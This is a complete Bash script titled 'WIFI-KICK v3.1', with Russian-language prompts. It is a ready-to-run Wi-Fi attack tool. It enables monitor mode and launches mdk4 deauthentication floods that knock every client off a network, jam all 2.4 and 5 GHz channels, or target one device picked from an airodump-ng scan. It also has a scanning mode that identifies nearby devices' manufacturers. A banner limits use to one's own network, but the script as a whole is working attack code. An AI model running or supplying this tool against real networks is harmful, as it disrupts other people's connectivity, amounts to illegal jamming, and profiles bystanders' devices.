#!/bin/bash

# ╔════════════════════════════════════════════════════════╗
# ║                       WIFI-KICK v3.1                             ║
# ║               Деаутентификация клиентов Wi-Fi                    ║
# ║                 Локальная OUI-база: oui.csv                      ║
# ║                                                                  ║
# ║   Автор: Punisher-ULTRA                                          ║
# ║   GitHub: https://github.com/Punisher-ULTRA/wifi-kick-ru         ║
# ║                                                                  ║
# ╚════════════════════════════════════════════════════════╝

RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
MAG='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Путь к OUI-базе
OUI_FILE="$(dirname "$0")/oui.csv"

clear
echo -e "${RED}"
cat << "BANNER"
 __        _____ _____ ___      _  _____ ____ _  __        _____  _ 
 \ \      / /_ _|  ___|_ _|    | |/ /_ _/ ___| |/ / __   _|___ / / |
  \ \ /\ / / | || |_   | |_____| ' / | | |   | ' /  \ \ / / |_ \ | |
   \ V  V /  | ||  _|  | |_____| . \ | | |___| . \   \ V / ___) || |
    \_/\_/  |___|_|   |___|    |_|\_\___\____|_|\_\   \_/ |____(_)_|
                                              
BANNER
echo -e "${NC}"
echo -e "${BOLD}${CYN}                  Деаутентификация клиентов Wi-Fi${NC}"
echo -e "${BOLD}${MAG}                      Автор: Punisher-ULTRA${NC}"
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  ВНИМАНИЕ: Только для тестирования СОБСТВЕННОЙ сети!             ║${NC}"
echo -e "${RED}║  Атака на чужие сети НЕЗАКОННА.                                  ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Проверка root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Скрипт нужно запускать от root: sudo $0${NC}"
    exit 1
fi

# Проверка oui-базы
if [ ! -f "$OUI_FILE" ]; then
    echo -e "${YEL}[!] Файл oui.csv не найден в папке со скриптом.${NC}"
    echo -e "${YEL}[*] Будет использован онлайн-режим (медленнее).${NC}"
    USE_LOCAL_OUI=false
else
    echo -e "${GRN}[+] Найдена локальная OUI-база: $OUI_FILE${NC}"
    USE_LOCAL_OUI=true
fi

# Поиск WI-FI адаптера
echo -e "${BLU}[*] Поиск Wi-Fi адаптера...${NC}"
INTERFACE=$(iwconfig 2>/dev/null | grep "IEEE 802.11" | awk '{print $1}')

if [ -z "$INTERFACE" ]; then
    echo -e "${RED}[!] Wi-Fi адаптер не найден.${NC}"
    exit 1
fi

echo -e "${GRN}[+] Найден адаптер: $INTERFACE${NC}"

# Выбор режима
echo ""
echo -e "${YEL}[?] Выбери режим атаки:${NC}"
echo -e "    ${GRN}1${NC}) Выбить ВСЕХ из сети (деаутентификация)"
echo -e "    ${GRN}2${NC}) Глушение всего диапазона (шум на всех каналах)"
echo -e "    ${GRN}3${NC}) Прицельная атака на конкретное устройство"
echo -e "    ${GRN}4${NC}) Сканирование с определением производителя (OSINT)"
echo ""
read -p "Введи номер (1-4): " MODE

# Выбор диапазона
echo ""
echo -e "${YEL}[?] Выбери диапазон частот:${NC}"
echo -e "    ${GRN}1${NC}) Только 2.4 ГГц (каналы 1-14)"
echo -e "    ${GRN}2${NC}) Только 5 ГГц (каналы 36-165)"
echo -e "    ${GRN}3${NC}) ВСЁ сразу (2.4 + 5 ГГц одновременно!)"
echo ""
read -p "Введи номер (1-3): " BAND

case "$BAND" in
    1) CHANNELS="1-14" ;;
    2) CHANNELS="36-165" ;;
    3) CHANNELS="1-14,36-165" ;;
    *) 
        echo -e "${RED}[!] Неверный выбор, использую 2.4 ГГц.${NC}"
        CHANNELS="1-14"
        ;;
esac

# Включение мониторинга
echo -e "${BLU}[*] Включаю режим мониторинга...${NC}"
sudo airmon-ng check kill 2>/dev/null
sudo airmon-ng start "$INTERFACE" 2>/dev/null

MON_INTERFACE="${INTERFACE}mon"
sleep 2

if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Monitor"; then
    echo -e "${RED}[!] Не удалось включить режим мониторинга.${NC}"
    echo -e "${YEL}[*] Пробую альтернативный метод...${NC}"
    sudo ip link set "$INTERFACE" down
    sudo iw dev "$INTERFACE" set type monitor
    sudo ip link set "$INTERFACE" up
    MON_INTERFACE="$INTERFACE"
fi

echo -e "${GRN}[+] Режим мониторинга включён: $MON_INTERFACE${NC}"

# Функция: определение производителя по MAC
lookup_mac() {
    local mac="$1"
    local oui=$(echo "$mac" | cut -d':' -f1-3 | tr '[:lower:]' '[:upper:]' | tr -d ':')
    
    if [ "$USE_LOCAL_OUI" = true ]; then
        # Ищем в локальной базе
        local company=$(grep -i ",$oui," "$OUI_FILE" 2>/dev/null | head -1 | cut -d',' -f3 | tr -d '"')
        if [ -n "$company" ]; then
            echo -e "${GRN}    Производитель: $company${NC}"
            return
        fi
    fi
    
    # Онлайн-запрос (если в локальной базе нет или базы нет)
    echo -e "${YEL}[*] Онлайн-запрос...${NC}"
    local company=$(curl -s --connect-timeout 3 "https://api.maclookup.app/v2/macs/$mac" 2>/dev/null | grep -oP '"company":"\K[^"]+')
    
    if [ -z "$company" ]; then
        company=$(curl -s --connect-timeout 3 "https://api.macvendors.com/$mac" 2>/dev/null)
    fi
    
    if [ -z "$company" ]; then
        company="Неизвестно"
    fi
    
    echo -e "${GRN}    Производитель: $company${NC}"
}

# Функция: запуск глушения
start_jamming() {
    local target="$1"
    local channels="$2"
    
    if echo "$channels" | grep -q ","; then
        local band24=$(echo "$channels" | cut -d',' -f1)
        local band5=$(echo "$channels" | cut -d',' -f2)
        
        echo -e "${RED}[*] Запускаю глушение 2.4 ГГц ($band24) и 5 ГГц ($band5) одновременно!${NC}"
        echo -e "${YEL}[*] Для остановки нажми Ctrl+C${NC}"
        
        if [ -n "$target" ]; then
            sudo mdk4 "$MON_INTERFACE" d -S "$target" -c "$band24" &
            sudo mdk4 "$MON_INTERFACE" d -S "$target" -c "$band5"
        else
            sudo mdk4 "$MON_INTERFACE" d -c "$band24" &
            sudo mdk4 "$MON_INTERFACE" d -c "$band5"
        fi
    else
        echo -e "${RED}[*] Запускаю глушение на каналах: $channels${NC}"
        echo -e "${YEL}[*] Для остановки нажми Ctrl+C${NC}"
        
        if [ -n "$target" ]; then
            sudo mdk4 "$MON_INTERFACE" d -S "$target" -c "$channels"
        else
            sudo mdk4 "$MON_INTERFACE" d -c "$channels"
        fi
    fi
}

# Запуск атаки
case "$MODE" in
    1)
        start_jamming "" "$CHANNELS"
        ;;
    2)
        start_jamming "" "$CHANNELS"
        ;;
    3)
        echo -e "${YEL}[*] Сканирую сеть 15 секунд...${NC}"
        sudo airodump-ng "$MON_INTERFACE" --output-format csv -w /tmp/wifi_target 2>/dev/null &
        SCAN_PID=$!
        sleep 15
        sudo kill $SCAN_PID 2>/dev/null
        
        echo ""
        echo -e "${YEL}[*] Найденные устройства:${NC}"
        echo -e "${CYN}----------------------------------------${NC}"
        
        declare -A MAC_LIST
        COUNTER=1
        
        while read line; do
            MAC=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
            if [ ${#MAC} -eq 17 ]; then
                MAC_LIST[$COUNTER]=$MAC
                echo -ne "${GRN}[$COUNTER] $MAC${NC} — "
                lookup_mac "$MAC"
                COUNTER=$((COUNTER + 1))
            fi
        done < <(grep -v "BSSID\|Station MAC" /tmp/wifi_target-01.csv 2>/dev/null | grep -v "^$")
        
        echo -e "${CYN}----------------------------------------${NC}"
        echo ""
        echo -e "${YEL}[?] Варианты действий:${NC}"
        echo -e "    ${GRN}1-$((COUNTER-1))${NC}) Выбрать устройство из списка"
        echo -e "    ${GRN}M${NC}) Ввести MAC-адрес вручную"
        echo ""
        read -p "Твой выбор: " CHOICE
        
        if [ "$CHOICE" = "M" ] || [ "$CHOICE" = "m" ]; then
            read -p "Введи MAC-адрес цели: " TARGET_MAC
        else
            TARGET_MAC="${MAC_LIST[$CHOICE]}"
            if [ -z "$TARGET_MAC" ]; then
                echo -e "${RED}[!] Неверный выбор.${NC}"
                exit 1
            fi
        fi
        
        start_jamming "$TARGET_MAC" "$CHANNELS"
        ;;
    4)
        echo -e "${YEL}[*] Сканирую сеть 15 секунд...${NC}"
        sudo airodump-ng "$MON_INTERFACE" --output-format csv -w /tmp/wifi_osint 2>/dev/null &
        SCAN_PID=$!
        sleep 15
        sudo kill $SCAN_PID 2>/dev/null
        
        echo ""
        echo -e "${YEL}[*] Найденные устройства:${NC}"
        echo -e "${CYN}----------------------------------------${NC}"
        
        while read line; do
            MAC=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
            if [ ${#MAC} -eq 17 ]; then
                echo -ne "${GRN}$MAC${NC} — "
                lookup_mac "$MAC"
            fi
        done < <(grep -v "BSSID\|Station MAC" /tmp/wifi_osint-01.csv 2>/dev/null | grep -v "^$")
        
        echo -e "${CYN}----------------------------------------${NC}"
        echo ""
        echo -e "${YEL}[*] Сканирование завершено. Атака не проводилась.${NC}"
        ;;
    *)
        echo -e "${RED}[!] Неверный режим.${NC}"
        ;;
esac

# Возврат в обычный режим
echo ""
echo -e "${BLU}[*] Возвращаю адаптер в нормальный режим...${NC}"
sudo pkill mdk4 2>/dev/null
sudo airmon-ng stop "$MON_INTERFACE" 2>/dev/null
sudo systemctl restart NetworkManager 2>/dev/null
sudo ip link set "$INTERFACE" up 2>/dev/null
echo -e "${GRN}[+] Готово. Адаптер в нормальном режиме.${NC}"
